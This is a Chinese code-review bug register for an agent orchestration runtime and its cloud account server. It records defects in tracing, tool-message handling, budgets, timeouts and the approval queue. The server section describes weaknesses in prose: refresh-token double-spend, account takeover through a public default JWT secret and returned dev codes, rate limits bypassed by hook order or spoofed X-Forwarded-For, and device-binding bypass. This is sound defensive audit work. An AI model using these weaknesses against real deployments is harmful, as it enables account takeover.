| REV-340 | 中 | 可观测性/生命周期（追踪键漂移造成第四类孤儿行） | `Src/Core/AgentRuntime/agentExecutor.ts:60`（`traceId = 'trace-exec-' + Date.now().toString(36)`）↔ `:82`（`createLoopState({ ..., traceId })` 用的就是这个新 trace，而不是 `agent.traceId`）↔ `Src/Tools/Custom/submitForReview.ts`（工具上下文里的 `context.traceId` 即该新 trace，且 `ensureReviewerAgent(traceId)` 按它查找/创建 Reviewer，见 `Src/Services/ReviewerAgent/reviewerAgent.ts:82-91`）↔ `Src/Core/Decision/orchestrator/orchestrator.ts`（`releaseRunAgents(plan)` 只遍历计划内 `agentId`，不认识 reviewer）| 现象：`/execute` 跑出来的每一轮都在一个**与编排计划无关**的 trace 下留痕——`Logs/business.log` 里无法用任务 trace 关联到这次执行，评审链路若走通则 Reviewer 实例登记在 `trace-exec-*` 下、不属于任何计划，`releaseRunAgents` 收不到它。取证：`Data/db/civitas_main.db` 里存在 `trace_id = 'trace-exec-mv0vfbh0'` 的 2 行、`destroyed_at` 全为 `null`（`.tmp/p17-review-evidence.out` 22 段"exec孤儿trace统计"），这类行既不会被 `countLiveAgentsByTrace(计划trace)` 数到，也不会被任何收尾路径销毁。影响：Agent 监控与审计链条断裂（同一任务的历史散在两个 trace 下）＋ 幽灵行的第四个来源。修复方向：`executeAssignedTask` 应沿用 `agent.traceId`（无则新建并回写到该 Agent 行），使执行、评审、回收共用一个追踪键 | ✅真实取证(2026-10-09，库内 7 个 `trace-exec-*` trace 共 8 行 `destroyed_at IS NULL`) · ✅已修复(2026-10-09，P1-8)：`executeAssignedTask` 改为 `const traceId = agent.traceId \|\| 'trace-exec-…'`（沿用在册 trace，无 trace 才新建），执行/评审/回收共用同一追踪键；复验见 §16.12（真实进程一轮 DELEGATION 跑完，`created_at >= 本次开跑` 的 `trace-exec-*` 行为 **0 行**）。遗留：历史 8 行孤儿不手工删除（口径同 REV-336） |
| REV-341 | 高 | 交互逻辑/错误呈现（提供方直接拒绝，却被报成成功） | `Src/Core/Loop/runIteration.ts:988`（把助手输出按 `{role:'assistant', content}` 追加，**不带 `tool_calls` 字段**）↔ `:990-995`（紧随其后追加 `{role:'tool', tool_call_id}` 结果）↔ `:294-341`（`parseModelOutput` 在无原生 `tool_calls` 时从文本的 tool_call 代码块里解析调用）↔ `Src/Core/AgentRuntime/agentExecutor.ts:96-105`（只要 `executeLoop` 回 `ok` 就返回，`exitReason` 取 Loop 的收敛原因，不检查末轮输出是否为错误文本）| 现象：真实后端里**凡是发生过一次工具调用的非流式 Loop，第二轮必被提供方拒绝**——`ModelArts.81001 … Invalid messages at index 2（或 3）. Messages with role 'tool' must be a response to a preceding message with 'tool_calls'`（本轮取证 6 次调用 6 次复现：`.tmp/p17-real-evidence.out` 32/41 段、`.tmp/p17-review-evidence.out` 10 段六个 attempt）。影响有两层：① 工具循环实际上跑不过第二轮，Worker 永远走不到 `agent.submit_review`（这是 ④⑤ 在真实进程不可达的直接原因）；② 更糟的是**失败被伪装成成功**——`POST /api/agents/:id/execute` 回 `200`，`exitReason` 是 `success` 或 `max_iterations`，`output` 字段里才是那句 `ERROR: …(400)`，调用方与界面按成功处理。边界说明（不夸大）：`ipcBridge.ts:1226` 的聊天路径共用同一段追加逻辑，理应有同样问题，但 `approvals` 表里存在跑到第 6 轮的历史工具会话，说明该拒绝并非恒现（疑与是否走原生 `tool_calls`、流式与否、或提供方校验版本有关），**触发条件未取证**，因此本条只按 `/execute` 非流式路径的确凿证据登记。修复方向：文本解析出的工具调用必须在历史里合成带 `tool_calls` 的 assistant 消息（与 `tool_call_id` 成对），或在不支持原生 `tool_calls` 时改用 `role:'user'` 文本回填工具结果；`agentExecutor` 则要把"末轮含提供方错误"识别为失败并回 `err`，而不是 200＋错误文本 | ✅真实取证(2026-10-09，6 次 `/execute` 6 次复现提供方 400) · ✅已修复(2026-10-09，P1-8)：实际剥离点有**四处**（不止登记的 `:988`/`:990` 两处）——④ ContextAssembly 映射、⑥ modelInput.messages 映射、跨轮历史追加的 assistant/tool 两条、以及 `openaiProvider` 的请求体序列化（`WireMessage` 此前只有 role/content），现全部保留 `tool_calls` / `tool_call_id`；`contextCompression` 补边界对齐（保留段不得以孤立 `role:'tool'` 开头，否则摘要后照样被拒）；非流式 `callModel` 失败不再把 `ERROR: …` 当 final answer 返回，而是短路成 `exitReason:'risk'` + `shortCircuitReason`。取证：`Tests/Core/toolMessageAssembly.spec.ts`(6) + 真实进程（`.tmp/p17-review-evidence.out` 后半：提供方 400 消失，两个 Worker 真的走到 `agent.submit_review` 并产生 2 条真实评审记录） |
| REV-342 | 中 | 数据一致性（`agents` 行与内存状态漂移） | `Src/Core/AgentRuntime/agentRegistry.ts:114-122`（`hydrateAgents()` 把库中 `running`/`creating` 降级为 `suspended` 并写回该行）↔ `Src/Core/AgentRuntime/stateMachine.ts`（`SUSPEND` 事件在**生产代码里没有任何发布点**，只有 hydrate 这一处会写出 `suspended`）↔ `Src/Core/AgentRuntime/agentExecutor.ts:41-43`（`suspended` 状态本应拒绝执行）| 现象：一次真实运行里 `agent-prime_director-11` 的 `agents` 行是 `status='suspended'`、`destroyed_at IS NULL`，而同一进程内 `POST /api/agents/agent-prime_director-11/execute` 返回 `200` 并真的跑了 2 轮（`.tmp/p17-evidence.out` 31/32 段）。两者只能有一个是对的：要么内存里它已不是 `suspended`（那库里这行就是陈旧审计，权威归属不明），要么写侧的状态守卫读的是另一份状态。影响：Agent 监控显示"已挂起"而系统同时在用它干活；`releaseRunAgents` 走的 `suspended → DESTROY` 虽是 `stateMachine` 允许的合法转移（用例已证），但"什么把它变成 suspended、该不该再执行"没有口径。修复方向：先定权威（建议库里行只是审计、内存为准，则 hydrate 的降级写回必须同时记录降级原因），再让 `/execute` 的准入判断与之一致；若库里状态就是权威，则 hydrate 之后任何再执行都要先显式 RESUME 并写回 | △真实取证(2026-10-09，同一进程内库行 `suspended` 与 `/execute` 返回 200 且实跑 2 轮并存) · 未修复（建议归 P2-2：这是**权威归属口径**问题，不是缺一段代码——先把"库里行是审计、内存为准"写进 §15/接口文档，再决定 hydrate 降级是否记原因、`/execute` 是否要求先 RESUME。P1-8 只在 `agentExecutor` 沿用了既有状态守卫，没有改变归属，故本条不宣称修复） |
| REV-343 | 中 | 可移植性/测试（import 大小写与磁盘不符） | 探针 `.tmp/caseDriftProbe.cjs`（用 `readdirSync` 建大小写真值表，再按 `.ts/.tsx/index.ts` 解析每条相对 import）↔ 命中 **27 处 / 6 个文件，全在 `Tests/`**：`Tests/Decision/multiAgentOrchestration.spec.ts`(6)、`Tests/E2E/assemblyLineMode.spec.ts`(5)、`Tests/E2E/consortiumMode.spec.ts`(5)、`Tests/E2E/delegationMode.spec.ts`(5)、`Tests/E2E/directExecution.spec.ts`(4)、`Tests/Parallel/parallelCollaboration.spec.ts`(2) | 现象：这些用例写成 `../../Src/Core/Decision/Orchestrator/orchestrator.js` / `RouteDecision/…` / `ComplexityAssessor/…`，磁盘上是 `orchestrator`、`routeDecision`、`complexityAssessor`（同目录里 `TaskDecomposer` **确实**大写，故那几处不算漂移）。Windows 文件系统大小写不敏感，`tsc --noEmit` 与 `vitest run` 全绿；一旦在大小写敏感的 CI（Linux）上运行，同一批文件会直接 `Cannot find module` / `Failed to resolve import`。影响：**"本地全库回归绿"不能作为 CI 绿的依据**，且因为生产代码（`Src/`、`Client/src`、`electron/`）零命中，坏的是测试与构建侧，不是运行时——所以本条登记为潜在断链而非当前故障。取证边界（诚实）：Linux 侧未实跑，命中集合来自静态真值表；CI 作业本身尚未落地（见 REV-289）。修复方向：按真值表逐处改成与磁盘一致，并把 `caseDriftProbe` 作为 CI 的一条门（与 P0-3 残留的 CI 作业同批落地） | △静态取证(2026-10-09，探针 27 处 / 6 文件，生产代码 0 命中) · 未修复（归 P0-3 残留：需要一个 Linux 运行来确证命中集合完整并作为门禁） |
| REV-344 | 中 | 数据一致性（子任务台账只在成功侧写入） | `Src/Core/Decision/orchestrator/subtaskDispatcher.ts`（`markSubtaskReviewed` 是 `subtasks` 表**唯一**的终态写点，只在评审通过/拒绝时被工具调用）↔ `Src/Core/Decision/orchestrator/orchestrator.ts:handleAssignmentTerminal`（收到 `task:failed` 只更新 `progressTracker`，不写台账）↔ `Src/Infra/Db/Repositories/subtaskRepository.ts:updateSubtaskStatus`（支持 `failureReason` 与 `incrementFailureCount`，但失败侧从没有人调用过） | 现象：P1-8 第一轮真实取证里 `tasks` 行已落 `failed` 并带 `_summary`，而同一任务的 `subtasks` 两行仍是 `status='assigned'`、`completed_at IS NULL`、`failure_reason IS NULL`（`.tmp/p18-driver-evidence.out` 21 段）。影响：任务台账与编排终态不一致——`subtasks` 是 §15 统一 ID 空间里子任务审计的主表，失败原因只活在事件流与 `tasks.final_result` 里，任何按 `subtasks` 聚合的读面（任务详情、统计、后续重派判断）都会显示"仍在执行"。加重因素：`markSubtaskReviewed` 的拒绝分支**已经**会把行写成 `failed` 并累加 `failure_count`，因此新增失败侧写入必须与它去重，否则一次拒绝计成两次失败。修复方向：新增 `markSubtaskFailed()` 并在 `handleAssignmentTerminal` 调用，同时排除评审侧来源 | ✅真实取证(2026-10-09，`.tmp/p18-driver-evidence.out` 21 段：tasks=failed 而 subtasks=assigned) · ✅已修复(2026-10-09，P1-8)：`markSubtaskFailed(subtaskId, reason)` 带终态幂等护栏（已 completed/failed/cancelled 的行不再改写、不再累加 `failure_count`）；`handleAssignmentTerminal` 只对 `source !== 'AgentRuntime/reviewSubmission'` 的 `task:failed` 调用它——拒绝侧台账由工具自身写入，事件流这侧不重复。双计风险是本批自查出来的（`reviewSubmission` 在 `performReview` 内发布，早于工具写台账），护栏与来源判定同时存在，缺一个就会双计。复验见 §16.12 第二轮取证 |
| REV-345 | 高 | 资源预算/口径漂移（任务书预算从未到达 Loop） | `Src/Core/Decision/orchestrator/subtaskDispatcher.ts`（`subtasks.token_budget` 落库，实测 15000/子任务）↔ `Src/Core/Decision/orchestrator/orchestrator.ts:477,564,641`（`task:assigned` 载荷此前**不含** `tokenBudget`/`maxIterations`/`instruction`）↔ `Src/Core/AgentRuntime/agentExecutor.ts:70-95`（`createLoopConfig` 只覆盖 `max_iterations`/`timeout_ms`，`token_budget` 走 `DEFAULT_LOOP_CONFIG`）↔ `Src/Core/Loop/loopConfig.ts:20-27`（`DEFAULT_LOOP_CONFIG.token_budget = 100_000`）↔ `Src/Core/Loop/iterationController.ts:52` 与 `Src/Services/Supervision/postSupervision.ts:97`（两处 `budget_exhausted` 都以 LoopConfig 那把为准） | 现象：真实一轮 DELEGATION 里两个 Worker 各跑 2 轮却消耗 **416907 / 416532** token（`.tmp/p18-driver-evidence.out` 21 段 `tokensConsumed`），既不是任务书的 15000、也不是默认的 100000，而 `budget_exhausted` 这把闸从未生效。三层问题分开看：① **载荷丢字段**（派发侧不带预算，执行侧自然无从遵守）；② **单次调用即约 208K token**，说明用量统计或上下文规模本身有问题（与 128K 级上下文窗口不自洽），须与 P1-5 的限流/退避一起查；③ **优先级口径缺失**——任务书预算、`loopDefaults.token_budget`（第三处，见 REV-328）、`LOOP_LIMITS.maxTokenBudget` 硬上限三者谁覆盖谁没有文档，`Configs/default.json` 与代码各写一份 | ✅真实取证(2026-10-09，`.tmp/p18-driver-evidence.out` 21 段) · ①已修复(2026-10-09，P1-8)：三个派发点载荷补 `instruction`/`maxIterations`/`tokenBudget`，`taskDriver` 透传进 `executeAssignedTask`，后者以 `token_budget` 覆盖 `createLoopConfig`；用例 `Tests/Decision/taskDriverChain.spec.ts` 直接锁住 `tokenBudget: 15000` 的透传（断言的是执行参数，不是事件字段，避免"只测了发送侧"）。②③未修复（归 P1-5：预算口径与用量统计同批，先定"任务书 vs loopDefaults vs 硬上限"的优先级再改默认值）；**第三轮复验**(2026-10-09，`.tmp/p18-driver-evidence-3.out` 23 段)：两个 Worker 均以 `exitReason=budget_exhausted`、`iterations=2` 收尾——这把闸**现在真的会停**（第二轮里 worker-36 是 3 轮 420289）。但 ② 原样存在：单轮 tokensConsumed **417106 / 417196**，即一次调用就约 20.8 万 token，15000 的预算只能在**迭代边界**止损、挡不住单轮超支 28 倍。所以 ① 的准确口径是"预算现在会被执行"，而不是"花费会被控制在预算内" |
| REV-346 | 高 | 资源预算/口径漂移（任务书时限只是记录） | `Src/Core/Decision/orchestrator/subtaskDispatcher.ts`（`subtasks.timeout_ms` 落库，实测 150000）↔ `Src/Core/Decision/orchestrator/orchestrator.ts:498,588,668`（`task:assigned` 载荷不含时限）↔ `Src/Core/AgentRuntime/agentExecutor.ts`（`createLoopConfig` 覆盖 `max_iterations`/`token_budget`，从不覆盖 `timeout_ms`）↔ `Src/Core/Loop/loopConfig.ts`（`DEFAULT_LOOP_CONFIG.timeout_ms = 60000`） | 现象：与 REV-345 同族的一半——**预算透传了，时限没有**。真实取证（`.tmp/p18-driver-evidence-2.out` 21 段 + 23 段）：`subtasks.timeout_ms = 150000`，Loop 实际按默认 60s 那把闸走，而 `agent-worker-37` 从 12:10:20 跑到 12:20:25（**605s**，台账 4 倍、默认 10 倍）才落终态。影响：任务书承诺的时限在运行时不存在，`tasks`/`subtasks` 里没有任何一处能显示"超时"，用户等十分一种"150 秒的子任务"；同时时长类的失败原因（超时 vs 预算 vs 收敛）在终态里无法区分。修复方向：派发载荷带 `timeLimitMs`，执行侧覆盖 `timeout_ms` 并按 `LOOP_LIMITS` 钳制 | ✅真实取证(2026-10-09，`.tmp/p18-driver-evidence-2.out`：台账 150000ms vs 实耗 605s) · ✅已修复(2026-10-09，P1-8)：三个派发点载荷补 `timeLimitMs`、`taskDriver` 透传、`executeAssignedTask` 以 `timeout_ms` 进 `createLoopConfig`，越界时钳到 `[minTimeoutMs, maxTimeoutMs]` 并 `logger.warn` 留痕（不静默丢弃——口径同 REV-328"写了不生效"）。**边界（诚实）**：时限仍只在**迭代边界**判定，迭代内的阻塞等待不受它约束，那部分见 REV-348。**第三轮复验**(2026-10-09，`.tmp/p18-driver-evidence-3.out` 21 段)：`timeout_ms=150000` 与实耗同栏可比——两行 `elapsed_sec` 为 **36.476 / 35.606**（预算先触发即止损），整任务 75s 收尾，不再出现第二轮的 605s 越限 |
| REV-347 | 中 | 可观测性/台账（`started_at` 恒为 NULL） | `Src/Infra/Db/Repositories/subtaskRepository.ts:120-123`（`updateSubtaskStatus` 里 `'in_progress'` 是 `started_at` 的**唯一**写面）↔ `Src/Core/Decision/orchestrator/subtaskDispatcher.ts`（全库只有 `markSubtaskReviewed`/`markSubtaskFailed` 两个写点，状态只有 `completed`/`failed`）↔ `Client/src/views/TaskPanel.tsx`（子任务展示无耗时口径） | 现象：`subtasks` 表的两行在取证时 `started_at IS NULL` 而 `completed_at` 有值（`.tmp/p18-driver-evidence-2.out` 21 段），即"派发 → 已终态"两格之间**没有执行中状态**。影响：`completed_at - started_at` 无从计算，REV-346 的"是否超时"在数据上根本无法判定；任务面板与 Agent 监控也分不清"还没开始跑"和"正在跑"（串行队列里后排子任务长期显示 `assigned`，与前排正在执行的样子完全一样）。修复方向：驱动在真正开跑的那一刻把台账转 `in_progress`（不得在派发时刻写，否则串行队列的排队时间被算进执行时间），且不得把已终态的行复活 | ✅真实取证(2026-10-09，两行 `started_at IS NULL`) · ✅已修复(2026-10-09，P1-8)：新增 `markSubtaskStarted(subtaskId)`——先 `getSubtask` 判行存在且处于 `pending/assigned` 才写 `in_progress`（无行即 no-op，DIRECT/临时执行不污染子任务表；已终态不被复活），`taskDriver` 在队列头部（`tail.then` 内、`executeAssignedTask` 之前）调用。用例 `Tests/Decision/taskDriverChain.spec.ts` 的 REV-347 段（10/10 通过） |
| REV-348 | 高 | 交互逻辑/阻塞审批 × 后台队列（无人值守即整条挂死） | `Src/Services/LoopControl/middleware/toolSafetyGate.ts:253-386`（`DANGEROUS + IRREVERSIBLE` → 创建 CRITICAL 审批后 `await waitForApprovalDecision(..., timeoutMs = approval.timeoutSec * 1000)`，超时默认拒绝、不可恢复）↔ `Src/Core/Decision/orchestrator/taskDriver.ts`（**串行**队列，一次只跑一个 Loop）↔ `Src/Tools/Builtin/shellExec.ts`（`shell.exec` 判为 CRITICAL/IRREVERSIBLE，Worker 写代码时必然触发）↔ `:267` 与 `:310`（审批侧日志只带 `approvalId/toolName`，**不带 taskId/assignmentId/agentId**） | 现象：真实进程里 `agent-worker-37` 的 2 轮 Loop 消耗 605s，与两次 `12:10:25 → 12:15:25 → 12:20:25` 的 300s 审批阻塞**逐秒对齐**（`.tmp/p18-driver-evidence-2.out` 23 段 + `Logs/business.log`），期间 `tokensConsumed` 只有 5377——时间全花在等一个不会来的批准上。三层影响：① **后台任务天然无人审批**，而 P1-8 把执行接进后台队列后，一次 CRITICAL 工具调用就把整条串行队列挂住 `300s × 调用数`（后排子任务明明可跑却必须排队），这是后台化引入的新放大面；② 用户侧看不到关联——审批队列里的条目按 approvalId 呈现，无法回答"这是哪个任务的哪一步在等我"，`23_日志侧证` 的"错误与告警"为空正是因为审批日志不带任务键；③ 时限与预算都救不了它：`timeout_ms`/`token_budget` 只在迭代边界判定，迭代内的 `await` 不可中断（REV-346 的边界即此）。修复方向（**需产品口径，不能顺手改**）：审批等待时长应取 `min(approvalTimeoutSec, 子任务剩余时间预算)`；无人值守/后台路径应把"需人工审批"落成任务侧 `awaitingApproval` 中间态并**释放队列**去跑后排，待批准后回队；审批日志与事件必须携带 `taskId/assignmentId/agentId` 三键 | △真实取证(2026-10-09，两轮 300s 阻塞与终态时间逐秒对齐；"队列被挂住"是从串行队列语义推出的必然结果，未在第三轮里单独计时) · 未修复（建议归 P1-3 之后的专门批：涉及"后台任务遇到人工审批该怎么办"的产品口径——挂起、快速失败、还是降级为非不可逆工具） |






## 18. M13 云端账号服务（`Server/`，REV-349~383）

> **为什么补这一片**：§16.1 声明的覆盖口径是「`Client/src` / `Src/` 五层 / `electron/`+`Src/Interface/IpcBridge`」，**顶层 `Server/` 从未作为模块审过**——它是独立部署线（Fastify 5 + PostgreSQL，`Server/src/**` 5485 行 TS，仅 2 次提交且从未回看），却持有密码哈希（Argon2id）、JWT 访问令牌、刷新令牌家族、邮箱验证码、设备绑定，并承载记忆/设置/任务/A2A 的跨端同步。它是活的：`Client/src/services/serverApi.ts:74` 默认 `http://127.0.0.1:8787`、`Client/src/views/AccountPanel.tsx:169-174` 让用户自填、`electron/urlPolicy.ts:54` 为它专门放开回环 http、`Src/Services/Governance/serverIdentity.ts` 拿它当**治理身份的信任锚**。
> **口径不变**：只登代码自身缺陷；`Server/**` 的文档漂移不登。
> **本轮取证强度**：`✅复核` = 主审亲自读码；`✅实证` = 主审亲自跑只读脚本复现（本轮两处，见 REV-349/352）。

### 18.1 Bug 登记表

| ID | 层 | 严重度 | 类别 | 一句话现象 | 证据 |
|---|---|---|---|---|---|
| REV-349 | 前端+远端 | 严重 | 交互/业务 | 「移除设备」「登出该设备」用 POST 打服务端的 DELETE 路由 → **恒 404「接口不存在」，功能 100% 坏死**；正确的 `serverDelete` 已存在却零调用 | ✅复核 · ✅实证（`fastify@5.12.5` inject：`POST /v1/me/devices/dev-1` → `404 {code:NOT_FOUND}`，同 URL `DELETE` → 200） |
| REV-350 | 远端服务 | 严重 | 安全/并发 | 刷新令牌轮换是「裸 SELECT 读 → 签发 → 再 UPDATE 吊销」且丢弃吊销返回值 → 同一令牌**并发双花**，两个新令牌同时活，「重放即吊销整族」的盗用检测永不触发 | ✅复核（`Server/src/services/authService.ts:254-300`、`repositories/refreshTokens.ts:55-69`） |
| REV-351 | 远端服务 | 严重 | 安全/配置 | 非生产形态三件事叠成**任意账号接管**：JWT 密钥缺省是仓库内公开示例值且只在 `NODE_ENV===production` 才拒启动、`ALLOW_DEV_CODE` 把 6 位码回传响应、`login-with-code` 对新邮箱自动建号 | ✅复核（`Server/src/config.ts:233-242,251-253,284`、`.env.example:5,21`）/ △（`authService.ts:477,527-536` 行号未逐字核） |
| REV-352 | 远端服务 | 高 | 安全/门禁 | 按用户的写限流（`RATE_LIMIT_WRITE_PER_MIN`）**一次都没执行过**：全局 `preHandler` 恒排在路由级 authGuard 之前，`if (!userId) return` 每请求提前返回 | ✅复核 · ✅实证（fastify 5.12.5 钩子顺序实测：`GLOBAL_PREHANDLER auth=undefined` 先于 `ROUTE_GUARD`）· 两个子代理独立同判 |
| REV-353 | 远端服务 | 高 | 安全 | 严格设备模式可绕过：`credential_hash` 入库后**全仓零读取**（只验字符串相等），`deviceId` 由请求体自报，且 register/login/refresh 的 schema 根本没有 `deviceId` 字段 → **密码登录与令牌刷新完全不受 `deviceBindingMode` 约束** | ✅复核（`repositories/users.ts:111,148,154` + 全仓 grep `credential_hash` 命中仅写入/测试/迁移；`http/schemas.ts:14-30`） |
| REV-354 | 远端服务 | 高 | 安全/数据 | 「移除设备」的安全语义只做一半：既不解绑该设备的会话（DDL 里 `refresh_tokens` 只有 `device_label text`，无 device 外键），下次验证码登录又把 `revoked_at` 写回 `NULL` **静默复活** | ✅复核（`authService.ts:412-422`、`migrations/001_init.sql:35`、`repositories/users.ts:157`） |
| REV-355 | 三端 | 高 | 安全/交互 | **G-09 方案 B（服务端身份验真）在生产形态下恒不执行，且失效方向是 fail-open**：两个接入点都是 `if (token)` 条件启用，客户端从不向本地后端出示账号 Bearer，`CIVITAS_SERVER_URL` 全仓零写入方 → CRITICAL 审批的「可信 userId」这一层从未生效 | ✅复核（`Src/Interface/RestApi/approvalApi.ts:110-114`、`a2aApi.ts:44-46`、`Governance/serverIdentity.ts:46`、`Client/src/services/api.ts:166-172` 只附 `X-Civitas-Api-Token`；grep `CIVITAS_SERVER_URL` 全仓仅 2 处命中且都在该模块自身） |
| REV-356 | 远端服务 | 高 | 安全 | 整条服务线**无任何 TLS 能力**（`listen({host,port})` 无 https 项、`config.ts` 无 TLS 键、响应头无 HSTS）→ 一开 `HOST=0.0.0.0` 就是同网段明文跑 password/refreshToken/deviceCredential/验证码 | ✅复核（`Server/src/index.ts:66`、`app.ts:111-117`）· 与 REV-164 同现象（那条记的是前端补 `http://`），**本条是 Server 侧根因，REV-164 的修复不覆盖此处** |
| REV-357 | 三端 | 高 | 业务/数据 | 备份**能导出、导不回**：导出走键集分页全量无上限，而 `POST /v1/restore` 撞默认 1 MB `bodyLimit`，客户端又是整包 inline 上行 | ✅复核（`Server/src/config.ts:197` 默认 1024*1024 ↔ `backupService.ts:92-111` 无上限 ↔ `Client/src/services/syncService.ts:519`、`AccountPanel.tsx:128,146`）/ △（`stats.ts:43-48` 单条多值 INSERT 触 PG 65535 占位符上限约合 13k 事件，未实跑） |
| REV-358 | 三端 | 高 | 数据一致性 | 云端 upsert 无仲裁且**缺省字段把已删/已归档洗回默认值**：`status = EXCLUDED.status` 配 `input.status ?? active` → 不带 status 的写就把 `deleted/archived` 行改回 `active`、清空 `contradicted_by`、`access_count` 归零；任务侧 `archived_at = EXCLUDED.archived_at` 同理，且客户端每次 push 全量上行 → B 机旧快照覆盖 A 机新状态 | ✅复核（`Server/src/repositories/memories.ts:76-78,91` 原文）/ △（`repositories/tasks.ts:34-39`、`syncService.ts:474-479`） |
| REV-359 | 前端+远端 | 高 | 体验/业务 | 刷新失败不分类：`refresh()` 只要 `!res.ok`（含 NETWORK/TIMEOUT/429/5xx）就清令牌 + `adoptAccount(null)` → **一次掉线 = 登出 + 本地偏好与统计水位归零**，下次全量重扫/覆盖 | ✅复核（`Client/src/stores/accountStore.ts:326-336`、`services/serverApi.ts:333-340` 的 `onAuthLost('refresh_failed')`） |
| REV-360 | 远端服务 | 中高 | 安全 | `TRUST_PROXY=true` 后限流键与审计 IP 完全由客户端决定：伪造 XFF 即每次拿到新桶（暴破不限速）、可用 victim 真实 IP 灌满其桶定向锁死、非 IP 串写进 `inet` 列直接 500；该开关不在 `.env.example` 里 | △子代理（实测 XFF 决定 `request.ip`；`app.ts:121-127`、`config.ts:205`、`fastify/lib/request.js:113`）· 与 REV-138 同现象（不同代码路径，修复不覆盖） |
| REV-361 | 远端服务 | 中高 | 安全 | `authGuard` 只查 `revoked_at/expires_at`，**不比对 `user_id` 与令牌 `sub`、也不看 `users.status`** → 停用账号在下一个 TTL（900s）内仍读写全部数据面；叠加刷新令牌每次轮换重算 `expires_at`、无绝对寿命上限 | ✅复核（`Server/src/http/authGuard.ts:37-44` 原文；`authService.ts:158,288,294`） |
| REV-362 | 远端服务 | 中高 | 数据/并发 | 登录/注册的多步写不在事务里（`db.tx` 全服务只有改密那一处用过）：`markCodeUsed → createUser → upsertDevice → touchLastLogin → issueTokens` 五次独立往返，抖动即留下「验证码已烧 + 账号已建 + 无令牌」；`markCodeUsed` 返回 void 且丢弃 rowCount → 同一码并发双花无人察觉 | △子代理（`authService.ts:520-618,184-200,347`、`verificationCodes.ts:118-120`） |
| REV-363 | 远端服务 | 中高 | 数据/安全 | 后台巡检只清令牌：`cleanupExpiredCodes` **全仓零调用**，`audit_log` 无 purge 接口 → 两张表单调增长；且发码/登录审计把 `detail:{email}` 写进去，注销只置空 `user_id` → **邮箱 PII 永久滞留且无从按用户清除** | ✅复核（grep `cleanupExpiredCodes` 仅命中定义 `verificationCodes.ts:152`；`index.ts:38-50` 只调度 `purgeInactive`；`me.ts:76-79`）/ △（`authService.ts:436,471,496` 的 `detail.email`） |
| REV-364 | 远端服务 | 中高 | 数据一致性 | `restore` 的 replace 模式对任务元数据是「半替换」：记忆侧无条件 `DELETE FROM memories`，任务侧却 `if (mode===replace && taskItems.length > 0)` 才删 → 包内 tasks 为空时既有任务全部残留成幽灵 | ✅复核（`Server/src/services/backupService.ts:253-255` 与 `:266-268` 的不对称条件，原文已读） |
| REV-365 | 前端+远端 | 中高 | 契约/数据 | 记忆状态枚举两端分叉 + 软删墓碑永不可见：云端 `active/archived/deleted` ↔ 本地 `active/deprecated/contradicted`，每次往返丢一次语义；而云端列表默认滤 `deleted` 且客户端拉取不带 status 参数 → 删除在其它端永不出现，下次 push 又把它复活 | △子代理（`Client/src/services/syncService.ts:109-119,309-311` ↔ `Server/src/repositories/memories.ts:183-188`、`Src/Interface/RestApi/memoryApi.ts:156`） |
| REV-366 | 三端 | 中高 | 交互/数据 | 记忆下行不分批：一次拉最多 10000 条后**单次** `importLocalMemories` 打本地，本地 `memoryApi` 判超过 5000 条即回 413 → 整个下行失败且只记成一条 warning（上行侧却按 500 分批，形态不对称） | △子代理（`syncService.ts:305,348,353` ↔ `Src/Interface/RestApi/memoryApi.ts:194`） |
| REV-367 | 三端 | 中高 | 数据 | 统计水位用严格 `>` 且游标取末条 `occurredAt` → **与末条同毫秒的事件被永久跳过**；服务端明明有 `clientEventId` 幂等能力却收不到这些事件 | △子代理（`Src/Interface/RestApi/syncApi.ts:58,244` ↔ `Client/src/services/syncService.ts:462-463`） |
| REV-368 | 远端服务 | 中 | 日志/安全 | 想留的没留、该脱的没脱：`mailTransport` 把含明文验证码的 `text` 整段 `logger.info`（`text` 不命中脱敏键表），而同一件事在 `authService` 的 `code` 字段却被 `[REDACTED]`；生产唯一通道 `MAIL_WEBHOOK_URL` 只判非空、不校验 https | ✅复核（`Server/src/services/mailTransport.ts:56-68` 与 `logger.ts:23-33` 原文；`config.ts:256` 只判非空） |
| REV-369 | 远端服务 | 中 | 业务 | `reset_password`（与 `register`）两种用途的验证码**零消费方**：schema 允许三种 purpose，全 src 只查 `login` → 忘记密码不可自助（改密必须当前密码），而请求发出的码照样消耗该邮箱配额并落审计；更误导的是 `loginWithCode` 会把这张「重置」码当登录码报「验证码无效」 | ✅复核（grep：`schemas.ts:51` 三值 ↔ `authService.ts:488` 固定 login；两个子代理独立同判） |
| REV-370 | 远端服务 | 中 | 日志 | `LOG_LEVEL` 只做字符串校验不进枚举，而 `emit` 是 `if (LEVEL_ORDER[level] < LEVEL_ORDER[minLevel]) return` → minLevel 非键（如 pino 合法的 `fatal`、大写值）时右侧 undefined、比较恒假，**全部级别含 debug 一并输出**（运维想静音反成洪泛） | ✅复核（`Server/src/logger.ts:57` 原文 + `config.ts:203`、`app.ts:70`） |
| REV-371 | 远端服务 | 中 | 日志 | 被限流这件事零留痕：`login` 失败有审计，`RATE_LIMITED` 抛出时既不 `request.log` 也不 `recordAudit` → 无法回答「谁在爆破」 | ✅复核（`Server/src/app.ts:130-134` 原文，无任何日志调用） |
| REV-372 | 远端服务 | 中 | 配置/门禁 | 整型配置只约束 `>=0`：`CODE_MAX_PER_WINDOW=0` 使发码恒 429、`CODE_MAX_ATTEMPTS=0` 使任何码都「无有效尝试」，两者都能通过全部 fail-fast 校验并正常 listen（静默禁用整条验证码登录） | △子代理（`config.ts:144-149` ↔ `authService.ts:432`、`verificationCodes.ts:91`） |
| REV-373 | 前端+桌面 | 中 | 契约/交互 | 桌面态与浏览器态打同一账号源行为分叉：`urlPolicy` 拒「非回环 http」，`serverApi.normalizeServerUrl` 又把无协议地址静默补成 `http://` → 局域网自托管（如 `192.168.x.x:8787`）浏览器可用、桌面必被拒；拒绝码 `SERVER_URL_REJECTED` 还是前端私有、不在服务端 ErrorCode 集合内 | △子代理（`electron/urlPolicy.ts:101-103` ↔ `Client/src/services/serverApi.ts:83,205-209`）· 与 REV-164 同族 |
| REV-374 | 三端 | 中 | 交互 | 429/`Retry-After` 全链路无人消费：服务端同时写响应头与 `details.retryAfterSec`，客户端只取 code/message 且无退避分支，桌面 `server-fetch` 又只回 `{ok,status,body}`；`retryPending` 无次数上限 → 撞限流后立刻重试反而放大限流 | △子代理（`Server/src/http/respond.ts:28-31` ↔ `Client/src/services/serverApi.ts:237-248`、`electron/main.ts:410-453`、`accountStore.ts:655-664`）· 与 REV-322 同源，本条补「body 里的 retryAfterSec 也没人读」 |
